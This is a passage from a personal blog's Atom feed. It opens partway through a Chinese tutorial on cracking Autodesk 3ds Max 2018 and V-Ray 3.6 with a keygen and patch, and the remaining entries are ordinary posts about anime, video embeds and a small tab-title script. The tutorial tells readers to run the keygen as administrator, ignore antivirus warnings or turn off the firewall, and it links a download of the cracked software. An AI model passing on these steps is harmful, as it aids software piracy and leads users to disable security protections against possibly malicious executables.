God"></p><ul><li>注意！到了这一步我们就不要再操作了，在任务栏里面右键，选择任务管理器，把它打开，结束掉图中的两个程序。之后关掉任务管理器即可.</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/li4UzV.jpg" alt="Lovely God"></p><p><img src="https://s2.ax1x.com/2019/12/25/li7wVS.jpg" alt="Lovely God"></p><p><img src="https://s2.ax1x.com/2019/12/25/li70Ug.jpg" alt="Lovely God"></p><ul><li>我们再次打开3D Max，和之前一样，弹出激活界面，选择序列号，点击激活，输入之前的序列号和产品密钥之后点击下一步.</li><li>到这里我们可以发现选项变了，选择我拥有激活码.</li><li>这时我们打开桌面上的注册机<strong>(注册机需要右键管理员身份运行，不然会报错)</strong>，部分杀毒软件会报毒它，我们不用担心，它是安全的，我们忽略掉杀毒软件的提示就可以了，如果注册机打不开，就是电脑系统防火墙将他阻止掉了，我们进去Windows安全中心，把它设为允许运行或不阻止就可以了，当然，嫌麻烦也可以直接关掉防火墙。</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/li7B5Q.jpg" alt="Lovely God"></p><ul><li>点击一下注册机上的<strong>Patch</strong>按钮，出现如下图窗口表示获取成功，弹出的窗口点击确定即可，如果出现其他类型的窗口表示获取失败，这种失败的情况往往是你没有让注册机以管理员身份运行所导致的.</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/li7rCj.jpg" alt="Lovely God"></p><ul><li>注册机获取成功之后我们复制申请号，选中申请号按住键盘上的 <strong>Ctrl + C</strong> 复制它.</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/li7s8s.jpg" alt="Lovely God"></p><ul><li>把注册机第一个输入框里面的英文删掉，按住键盘上的 <strong>Ctrl + V</strong> 把刚刚复制的申请号粘贴进去.弄好后点击最中间的<strong>Generate</strong>计算出激活码，算出来的激活码会自动写到注册机的第二个框内，我们选中第二个框内所有的字母，按键盘上的 <strong>Ctrl + X</strong> 把它全部剪贴出来，注意不要漏选.</li><li>回到我们的3D Max激活里面，把注册机算出来的激活码填入那些小方格中，在第一个小方格中按住键盘上的 <strong>Ctrl + V</strong> 可一次性将刚刚复制的激活码粘贴进去，填好之后我们点击下一步，然后等待激活即可.</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/li7y2n.jpg" alt="Lovely God"></p><ul><li>出现下图表示激活成功，点击完成即可，这时已经可以关闭注册机了，如果出现激活产品失败请重复上述激活步骤，多试几次即可激活软件.</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/li76vq.jpg" alt="Lovely God"></p><hr><h2 id="VRay-3-6-3D-Max必装渲染器"><a href="#VRay-3-6-3D-Max必装渲染器" class="headerlink" title="VRay 3.6(3D Max必装渲染器)"></a>VRay 3.6(3D Max必装渲染器)</h2><ul><li>首先，把VRay解压至桌面，安装完成之后比较好整理.</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/li72rV.jpg" alt="Lovely God"></p><p><img src="https://s2.ax1x.com/2019/12/25/li7RbT.jpg" alt="Lovely God"></p><ul><li>打开刚刚解压出来的Vray文件夹，得到两个文件夹，分别是Vray 3.6和破解+汉化工具.</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/li7fVU.jpg" alt="Lovely God"></p><ul><li>先进入第一个文件夹Vray 3.6 ，里面有一个Vray的安装程序，我们右键管理员身份运行它.</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/li7haF.jpg" alt="Lovely God"></p><ul><li>打开Vray会弹出一个CMD窗口和一个安装窗口，我们不要理会CMD窗口，我们先点击安装窗口右下角的 <strong>l Agree</strong> 按钮.</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/li7454.jpg" alt="Lovely God"></p><ul><li>然后会出来好几个选项，我们都不要理会，找到<strong>Customize</strong>按钮并点击它.</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/li7IPJ.jpg" alt="Lovely God"></p><ul><li>出现下图，这里我们需要更改一下他的安装路径，把Vray安装到3D Max所在的那个磁盘里，(如我的3D Max安装在D盘，我的Vray就需要安装到D盘里),注意这里不要更改后面的文件路径，我们把路径开头的字母更改一下就可以了，(比如我需要安装到D盘，直接把路径开头的<strong>C:\</strong>改为<strong>D:\</strong>就可以改到D盘了)，然后我们点击<strong>lnstall Now</strong>进入下一个页面.</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/li7oG9.jpg" alt="Lovely God"></p><ul><li>这里把默认勾选的那两个选项的勾去掉，然后点击<strong>Finish</strong>开始安装.</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/li7T2R.jpg" alt="Lovely God"></p><ul><li>等待安装完成…</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/li77x1.jpg" alt="Lovely God"></p><ul><li>安装完成后会再次弹出Vray的安装窗口，我们和之前一样，点击 <strong>l Agree</strong> 按钮进入下一步.</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/li7bKx.jpg" alt="Lovely God"></p><ul><li>这里点击<strong>Customize</strong>按钮进入配置页面.</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/li7LqK.jpg" alt="Lovely God"></p><ul><li>这里就不要改了，默认就好，直接点击 <strong>lnstall Now</strong> 按钮开始安装即可.</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/li7jaD.jpg" alt="Lovely God"></p><ul><li>等待安装完成，出现下图界面.</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/li7zPH.jpg" alt="Lovely God"></p><ul><li>到这里不要再继续操作了，点击右上角的”<strong>X</strong>“选择”<strong>是</strong>“关掉窗口即可.</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/liHSGd.jpg" alt="Lovely God"></p><ul><li>到这里Vray渲染器就算安装完成了.</li></ul><hr><h2 id="Vray破解·汉化"><a href="#Vray破解·汉化" class="headerlink" title="Vray破解·汉化"></a>Vray破解·汉化</h2><ul><li>我们回到Vray破解+汉化的那个文件夹，<strong>右键以管理员身份运行</strong>里面的破解补丁.</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/li7vIe.jpg" alt="Lovely God"></p><ul><li>在弹出的窗口内点击下一步，上面的选项不需要修改，直接点击安装即可.</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/liHpRA.jpg" alt="Lovely God"></p><p><img src="https://s2.ax1x.com/2019/12/25/libFp9.jpg" alt="Lovely God"></p><ul><li>破解完成后我们<strong>右键以管理员身份运行</strong>汉化补丁，选择”<strong>我接受</strong>“进入下一个界面.</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/lib9kF.jpg" alt="Lovely God"></p><p><img src="https://s2.ax1x.com/2019/12/25/libA61.jpg" alt="Lovely God"></p><ul><li>这里会弹出汉化补丁作者的赞助二维码，需要等待30秒才能点击下一步，当然，如果你是个有钱人的话，你在这30秒内也可以选择投喂开发者.</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/libPfJ.jpg" alt="Lovely God"></p><ul><li>30秒后点击下一步，进入安装配置界面，这里不需要更改任何选项，直接点击安装等待完成即可.</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/libCY4.jpg" alt="Lovely God"></p><ul><li>到这里，Vray渲染器已完美破解，在3D Max渲染器设置内即可调出来使用.</li></ul><hr><h2 id="整理安装残留-大佬可以跳过"><a href="#整理安装残留-大佬可以跳过" class="headerlink" title="整理安装残留 (大佬可以跳过)"></a>整理安装残留 (大佬可以跳过)</h2><ul><li>3D max会自动安装一个桌面程序，他是开机自动启动的，为了它不拖慢我们的系统，我们启动任务管理器选择启动一栏，找到下图中的那个程序右键将它禁用掉即可.</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/libEOx.jpg" alt="Lovely God"></p><ul><li>安装完上述软件会残留下来不少垃圾文件，我们将第一次新建的名为3D Max安装程序的文件夹，从电脑内删除掉.</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/libe0K.jpg" alt="Lovely God"></p><ul><li>将桌面上的注册机等等没用的文件全部清理掉.</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/lib0pj.jpg" alt="Lovely God"></p><ul><li>最后清理掉电脑回收站，即可将电脑清理至最佳状态.</li></ul><blockquote><p>弄好后推荐将电脑重启一下再使用哦！</p></blockquote><hr><h2 id="软件下载"><a href="#软件下载" class="headerlink" title="软件下载"></a>软件下载</h2><ul><li><p>软件下载地址：<a href="https://pan.baidu.com/s/1s_Z_kEqbg_YLt6BeKhB8-A" target="_blank" rel="noopener">百度网盘</a></p></li><li><p>提取码：<strong>kktz</strong></p></li><li><p>顾及小白的感受，写超详细教程实属不易<br>不知道有人赞赏一下我么╰(￣ω￣ｏ)<br>疯狂暗示(≖ ‿ ≖)✧</p></li></ul>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;需要资源：&quot;&gt;&lt;a href=&quot;#需要资源：&quot; class=&quot;headerlink&quot; title=&quot;需要资源：&quot;&gt;&lt;/a&gt;需要资源：&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;3D Max安装包&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;3D Max注册机&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;VRay渲染器（3D 必装）&lt;/strong&gt; &lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;VRay破解工具&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;VRay汉化工具&lt;/strong&gt;&lt;blockquote&gt;
+&lt;p&gt;本篇文章以&lt;strong&gt;2018年版&lt;/strong&gt;的&lt;strong&gt;3D Max&lt;/strong&gt;和&lt;strong&gt;VRay 3.6&lt;/strong&gt;为例，在Windows 10系统上进行安装操作，其他版本安装过程可能略有不同。本文仅供参考。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+    
+    </summary>
+    
+    
+      <category term="创作集" scheme="http://lovek.me/categories/%E5%88%9B%E4%BD%9C%E9%9B%86/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>2018 ChinaJoy 参展日记</title>
+    <link href="http://lovek.me/cs/"/>
+    <id>http://lovek.me/cs/</id>
+    <published>2019-11-02T15:42:32.000Z</published>
+    <updated>2020-01-19T15:33:09.499Z</updated>
+    
+    <content type="html"><![CDATA[<div id="player-cj"></div><script type="text/javascript" src="https://player.dogecloud.com/js/loader"></script><script type="text/javascript">var player = new DogePlayer({    container: document.getElementById('player-cj'),    userId: 17,    vcode: '10c5de157e5129c0',    screenshot: true,    autoPlay: false});</script><a id="more"></a>]]></content>
+    
+    <summary type="html">
+    
+      &lt;div id=&quot;player-cj&quot;&gt;&lt;/div&gt;
+&lt;script type=&quot;text/javascript&quot; src=&quot;https://player.dogecloud.com/js/loader&quot;&gt;&lt;/script&gt;
+&lt;script type=&quot;text/javascript&quot;&gt;
+var player = new DogePlayer({
+    container: document.getElementById(&#39;player-cj&#39;),
+    userId: 17,
+    vcode: &#39;10c5de157e5129c0&#39;,
+    screenshot: true,
+    autoPlay: false
+});
+&lt;/script&gt;
+    
+    </summary>
+    
+    
+      <category term="日记本" scheme="http://lovek.me/categories/%E6%97%A5%E8%AE%B0%E6%9C%AC/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>【零之魔法书】吾辈的佣兵不会输！</title>
+    <link href="http://lovek.me/av4/"/>
+    <id>http://lovek.me/av4/</id>
+    <published>2019-11-01T14:50:00.000Z</published>
+    <updated>2020-01-19T15:43:48.755Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>从零开始的魔法书</strong><br>bilibili干杯( ゜- ゜)つロ</p><div id="player"></div><script type="text/javascript" src="https://player.dogecloud.com/js/loader"></script><script type="text/javascript">var player = new DogePlayer({    container: document.getElementById('player'),    userId: 906,    vcode: 'a80be30853816dd8',    autoPlay: false});</script><a id="more"></a><br><p><strong>简介：</strong></p><ul><li><p>教会历526年——天下上存在着魔女，并有一种叫『魔术』的学问。但是，众人还没有知晓『魔法』的存在。一个被世人鄙弃的『兽化者』，半人半兽的佣兵出世在这个时期。 做梦都想要变回人类的他，在某一天与魔女相遇。他的运气，也随之改动。</p></li><li><p>『<strong>你想变回人类么？那就当吾辈的保镖吧，佣兵！</strong>』自称『零』的魔女告诉他，一本会消灭天下的魔法书——『零之书』被人偷走了，她正为追回这本书而四处奔波。佣兵以『变回人类』为前提，开端担负自己最厌恶的魔女的保镖……</p></li><li><p>各自的念想，缭绕着禁断的魔法书千节百扣！孤高的魔女与心肠仁慈的兽人，献上绝妙的魔幻剧！！</p></li><li><p>整体来说这是很不错的一部动漫，在B站上无意看到了并喜欢上了它，好了我要去看刚到的10本原著了</p></li></ul><p><strong>作者信息：</strong></p><p><strong>虎走翔</strong>，出生于东京。</p><ul><li>非常喜欢人外和王道冒险故事。喜欢浪漫喜剧，儿童文学，漫画和电影。兴趣是写小说，去游乐园。</li></ul><p><img src="https://s2.ax1x.com/2019/12/25/liOKtU.jpg" alt="一口气买全册bilibili干杯( ゜- ゜)つロ"></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;strong&gt;从零开始的魔法书&lt;/strong&gt;&lt;br&gt;bilibili干杯( ゜- ゜)つロ&lt;/p&gt;
+
+&lt;div id=&quot;player&quot;&gt;&lt;/div&gt;
+&lt;script type=&quot;text/javascript&quot; src=&quot;https://player.dogecloud.com/js/loader&quot;&gt;&lt;/script&gt;
+&lt;script type=&quot;text/javascript&quot;&gt;
+var player = new DogePlayer({
+    container: document.getElementById(&#39;player&#39;),
+    userId: 906,
+    vcode: &#39;a80be30853816dd8&#39;,
+    autoPlay: false
+});
+&lt;/script&gt;
+    
+    </summary>
+    
+    
+      <category term="创作集" scheme="http://lovek.me/categories/%E5%88%9B%E4%BD%9C%E9%9B%86/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>我藏好了哦</title>
+    <link href="http://lovek.me/av3/"/>
+    <id>http://lovek.me/av3/</id>
+    <published>2019-09-16T16:03:00.000Z</published>
+    <updated>2020-01-19T15:38:55.515Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="http://lovek.me/3.png" alt="你找不到我!"><br>在 Sonic 853 看到的神奇的一幕，一颗赛艇，果断扒来水一贴</p><a id="more"></a><p>原作者：<a href="http://chitanda.me/" target="_blank" rel="noopener">成天不高兴的栗山未来</a></p><p>什么鬼：离开和进入页面时改变title</p><p><strong>原理：</strong></p><p>使用了HTML5的Page Visibility API</p><p>目前页面可见性API有两个属性，一个事件，如下：</p><p>document.hidden: Boolean值，表示当前页面可见还是不可见</p><p>document.visibilityState: 返回当前页面的可见状态，取值有 hidden visible prerender preview</p><p>visibilitychange: 当可见状态改变时候触发的事件</p><p>以前只知道可以通过 iframe + onblur/onfocus事件 来检测页面可见性，有了这个 API 真是方便优雅了很多啊</p><p><strong>代码：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> OriginTitile = <span class="built_in">document</span>.title;</span><br><span class="line">  <span class="keyword">var</span> titleTime;</span><br><span class="line"><span class="built_in">document</span>.addEventListener(<span class="string">'visibilitychange'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"> <span class="keyword">if</span> (<span class="built_in">document</span>.hidden) &#123;</span><br><span class="line">    <span class="built_in">document</span>.title = <span class="string">'(つェ⊂)我藏好了哦~ '</span> + OriginTitile;</span><br><span class="line">    clearTimeout(titleTime);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">document</span>.title = <span class="string">'(*´∇｀*) 被你发现啦~ '</span> + OriginTitile;</span><br><span class="line">    titleTime = setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">document</span>.title = OriginTitile;</span><br><span class="line">       &#125;, <span class="number">2000</span>);</span><br><span class="line">     &#125;</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;http://lovek.me/3.png&quot; alt=&quot;你找不到我!&quot;&gt;&lt;br&gt;在 Sonic 853 看到的神奇的一幕，一颗赛艇，果断扒来水一贴&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="分享镜" scheme="http://lovek.me/categories/%E5%88%86%E4%BA%AB%E9%95%9C/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>可爱的和泉纱雾呐！</title>
+    <link href="http://lovek.me/av2/"/>
+    <id>http://lovek.me/av2/</id>
+    <published>2019-09-16T15:44:00.000Z</published>
+    <updated>2020-01-19T15:35:25.411Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>我玩b站以来第一个非常喜欢的动漫女主角╰(￣▽￣)╭嘿嘿~</strong></p><p><img src="https://s2.ax1x.com/2019/12/25/liLtJg.gif" alt="爱你呀"></p><a id="more"></a><p><strong>和泉纱雾</strong></p><ul><li>动漫作品《挨罗芒阿老师》中女主角。(￣▽￣)～■干杯□～(￣▽￣)</li><li>跟学生作家和泉正宗没有血缘关系的妹妹，同时也是负责他作品插画的“情色漫画老师”。</li><li>重度家里蹲，只要有其他人出现在家中，就绝对不会走出房间。跟第一眼给人的印象不同，她是个把感情全部都写在脸上的女孩。非常养眼的小可爱，你喜欢和她一起画画还是玩游戏呢！！</li></ul><p><strong>日常爱好：窝在家里</strong></p><p><strong>个人习惯：纱雾有边哼歌边画图的习惯。画画的时候，如果状态不错，心情会越来越好，最后就会开始哼歌。</strong><br><img src="http://lovek.me/1.jpg" alt="啦啦啦"></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;strong&gt;我玩b站以来第一个非常喜欢的动漫女主角╰(￣▽￣)╭嘿嘿~&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://s2.ax1x.com/2019/12/25/liLtJg.gif&quot; alt=&quot;爱你呀&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="闲言语" scheme="http://lovek.me/categories/%E9%97%B2%E8%A8%80%E8%AF%AD/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Hello,Word!</title>
+    <link href="http://lovek.me/av1/"/>
+    <id>http://lovek.me/av1/</id>
+    <published>2019-09-15T12:08:00.000Z</published>
+    <updated>2020-01-19T12:43:09.458Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>Hi, I am lovely god.</strong></p><a id="more"></a><ul><li><p>Lovely God可爱的博客，博客搭建期间使用了主题sagiri作为开发模板，真的省去了不少麻烦，感谢<a href="https://github.com/diygod" target="_blank" rel="noopener">sagiri的作者</a>.</p></li><li><p>以后的路还长，博客刚刚搭建，人气不高，还请大家多多访问我的博客哟♡</p></li><li><p>嘘～偷偷告诉小可爱们一个小秘密哦! </p></li></ul><blockquote><p>每个来这里的小可爱都有权限在博客下面进行评论留言哦，我看到的话就会回复你们哒♡</p></blockquote>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;strong&gt;Hi, I am lovely god.&lt;/strong&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="日记本" scheme="http://lovek.me/categories/%E6%97%A5%E8%AE%B0%E6%9C%AC/"/>
+    
+    
+  </entry>
+  
+</feed>
